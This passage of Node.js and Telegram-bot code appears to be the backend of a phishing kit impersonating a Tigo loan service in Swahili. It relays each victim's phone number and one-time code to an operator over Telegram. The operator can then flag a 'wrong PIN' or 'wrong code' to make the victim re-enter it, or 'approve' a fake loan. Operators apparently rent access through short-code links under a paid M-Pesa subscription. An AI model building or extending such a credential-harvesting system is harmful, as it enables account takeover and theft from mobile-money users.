            await db.updateApplication(applicationId, { pinStatus: 'wrong' });
            
            await bot.editMessageText(`⚠️ User will re-enter PIN for \`${applicationId}\``, {
                chat_id: query.from.id,
                message_id: query.message.message_id,
                parse_mode: 'Markdown'
            });
            
            await bot.answerCallbackQuery(query.id, '⚠️ User redirected to PIN entry');
        } catch (error) {
            console.error('❌ Error:', error);
            await bot.answerCallbackQuery(query.id, '❌ Error', true);
        }
    }
});

// ==========================================
// API ENDPOINTS - OTP
// ==========================================

app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;

        if (!applicationId || !otp) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        const subscription = await db.getSubscription(application.adminId);
        if (subscription?.isLocked) {
            return res.status(403).json({ 
                success: false, 
                message: 'Admin access locked. Subscription fee required.' 
            });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `
📲 *OTP VERIFICATION REQUEST*

*Application ID:* \`${applicationId}\`
*Phone:* ${application.phoneNumber}
*OTP:* \`${otp}\`
⏰ ${new Date().toLocaleString('en-US')}

[❌ Wrong PIN] [❌ Wrong Code] [✅ Approve Loan]
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` },
                        { text: '❌ Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }
                    ],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({ success: true, status: application.otpStatus });
        } else {
            res.status(404).json({ success: false, message: 'Application not found' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        if (!applicationId) return res.status(403).json({ success: false, message: 'Invalid session.' });

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        await sendToAdmin(application.adminId, `🔄 *OTP RESEND REQUEST*\n\n📋 \`${applicationId}\`\n\nUser requested OTP resend.`, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// OTP approval callbacks
bot.on('callback_query', async (query) => {
    if (query.data.startsWith('approve_otp_')) {
        const parts = query.data.replace('approve_otp_', '').split('_');
        const [adminId, applicationId] = [parts[0], parts.slice(1).join('_')];

        try {
            await db.updateApplication(applicationId, { otpStatus: 'approved' });
            
            await bot.editMessageText(`✅ Loan approved for \`${applicationId}\``, {
                chat_id: query.from.id,
                message_id: query.message.message_id,
                parse_mode: 'Markdown'
            });
            
            await bot.answerCallbackQuery(query.id, '✅ Loan approved!');
        } catch (error) {
            console.error('❌ Error:', error);
            await bot.answerCallbackQuery(query.id, '❌ Error', true);
        }
    }

    if (query.data.startsWith('wrongcode_otp_')) {
        const parts = query.data.replace('wrongcode_otp_', '').split('_');
        const [adminId, applicationId] = [parts[0], parts.slice(1).join('_')];

        try {
            await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
            
            await bot.editMessageText(`⚠️ User will re-enter OTP for \`${applicationId}\``, {
                chat_id: query.from.id,
                message_id: query.message.message_id,
                parse_mode: 'Markdown'
            });
            
            await bot.answerCallbackQuery(query.id, '⚠️ User redirected to OTP entry');
        } catch (error) {
            console.error('❌ Error:', error);
            await bot.answerCallbackQuery(query.id, '❌ Error', true);
        }
    }

    if (query.data.startsWith('wrongpin_otp_')) {
        const parts = query.data.replace('wrongpin_otp_', '').split('_');
        const [adminId, applicationId] = [parts[0], parts.slice(1).join('_')];

        try {
            await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
            
            await bot.editMessageText(`⚠️ User will re-enter PIN for \`${applicationId}\``, {
                chat_id: query.from.id,
                message_id: query.message.message_id,
                parse_mode: 'Markdown'
            });
            
            await bot.answerCallbackQuery(query.id, '⚠️ User redirected to PIN entry');
        } catch (error) {
            console.error('❌ Error:', error);
            await bot.answerCallbackQuery(query.id, '❌ Error', true);
        }
    }
});

// ==========================================
// HEALTH CHECK
// ==========================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        lockedAdmins: lockedAdmins.size,
        botMode: 'webhook',
        timestamp: new Date().toISOString()
    });
});

// ==========================================
// PAGE ROUTES
// ==========================================

app.get('/', (req, res) => {
    if (req.query.admin) {
        console.log(`⚠️ Legacy admin link used: ${req.query.admin}`);
        return res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body><script>
            sessionStorage.setItem('selectedAdminId', '${req.query.admin.replace(/['"<>]/g, '')}');
            sessionStorage.setItem('validLink', 'true');
            window.location.replace('/index.html');
        </script></body></html>`);
    }
    res.sendFile(path.join(__dirname, 'invalid-link.html'));
});

app.get('/:code([a-z0-9]{3,10})', async (req, res) => {
    const code = req.params.code.toLowerCase();

    const reserved = ['index.html', 'application.html', 'verification.html', 'otp.html', 'approval.html', 'invalid-link.html', 'style.css'];
    if (reserved.some(r => code === r.replace('.html', '') || code === r)) {
        return res.sendFile(path.join(__dirname, req.params.code));
    }

    try {
        const admin = await db.getAdminByShortCode(code);

        if (!admin || admin.status !== 'active' || pausedAdmins.has(admin.adminId)) {
            console.log(`🚫 Invalid/inactive short code: ${code}`);
            return res.sendFile(path.join(__dirname, 'invalid-link.html'));
        }

        // Check if admin's subscription is locked
        const subscription = await db.getSubscription(admin.adminId);
        if (subscription?.isLocked) {
            return res.send(`<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akaunti Imefungwa - Mkopo wa Tigo</title>
    <style>
        body { font-family: 'Inter', sans-serif; min-height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; padding: 20px; }
        .card { background: white; border-radius: 24px; padding: 60px 48px; max-width: 480px; width: 100%; text-align: center; box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4); }
        .lock-icon { font-size: 80px; margin-bottom: 24px; display: block; }
        h1 { font-size: 28px; color: #111827; margin: 24px 0; font-weight: 800; }
        p { color: #6b7280; line-height: 1.7; margin: 16px 0; font-size: 15px; }
        .info { background: #fef3c7; border: 2px solid #fde68a; color: #92400e; padding: 24px; border-radius: 16px; margin: 32px 0; }
        .info strong { display: block; margin-bottom: 8px; font-size: 16px; }
        .info p { margin: 8px 0; }
    </style>
</head>
<body>
    <div class="card">
        <div class="lock-icon">🔒</div>
        <h1>Akaunti Imefungwa</h1>
        <p>Akaunti ya mkopaji imekatazwa kwa sababu ya ada ya suscription inayotaka kulipwa.</p>
        
        <div class="info">
            <strong>💰 Jinsi ya Kufungua Akaunti</strong>
            <p>1. Mkopaji anatuma M-Pesa ya TSh 500</p>
            <p>2. Anatuma rejeresi kwenye bot ya Telegram</p>
            <p>3. Super admin anathibitisha malipo</p>
            <p>4. Akaunti inafunguliwa tena</p>
        </div>
        
        <p><strong>Tarehe ya kulipwa:</strong> ${subscription.nextBillingDate ? new Date(subscription.nextBillingDate).toLocaleDateString('sw-TZ') : 'Haijulikani'}</p>
        <p>Mkopaji anahitaji kuwasiliana na mkopaji wake kwa maswali.</p>
    </div>
</body>
</html>`);
        }

        if (!adminChatIds.has(admin.adminId) && admin.chatId) {
            adminChatIds.set(admin.adminId, admin.chatId);
        }

        console.log(`✅ Short code ${code} → ${admin.name} (${admin.adminId})`);

        res.send(`<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mkopo wa Tigo — Inapakia...</title>
    <style>
        body { margin:0; min-height:100vh; background:linear-gradient(135deg,#667eea,#764ba2); display:flex; align-items:center; justify-content:center; font-family:sans-serif; }
        .loader { text-align:center; color:white; }
        .spinner { width:48px; height:48px; border:4px solid rgba(255,255,255,0.3); border-top:4px solid white; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 16px; }
        @keyframes spin { to { transform:rotate(360deg); } }
        p { font-size:16px; opacity:0.9; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Inapakia...</p>
    </div>
    <script>
        sessionStorage.setItem('selectedAdminId', '${admin.adminId}');
        sessionStorage.setItem('validLink', 'true');
        window.location.replace('/index.html');
    </script>
</body>
</html>`);
    } catch (error) {
        console.error('❌ Error in short code route:', error);
        res.sendFile(path.join(__dirname, 'invalid-link.html'));
    }
});

// ==========================================
// SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n👑 TIGO LOAN PLATFORM — SUBSCRIPTION MODE`);
    console.log(`=========================================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🔑 Links: yoursite.com/XXXXX (5-char codes)`);
    console.log(`💳 Subscriptions: ENABLED`);
    console.log(`📅 Auto-lock: 5th of each month`);
    console.log(`💰 Payment: Via M-Pesa + Super Admin approval`);
    console.log(`\n✅ Ready!\n`);
});

async function shutdownGracefully(signal) {
    console.log(`\n🛑 ${signal} — shutting down...`);
    try { await bot.deleteWebHook(); await db.closeDatabase(); process.exit(0); }
    catch (e) { console.error('❌ Shutdown error:', e); process.exit(1); }
}
process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));
process.on('unhandledRejection', (e) => console.error('❌ Unhandled rejection:', e?.message));
process.on('uncaughtException', (e) => console.error('❌ Uncaught exception:', e?.message));
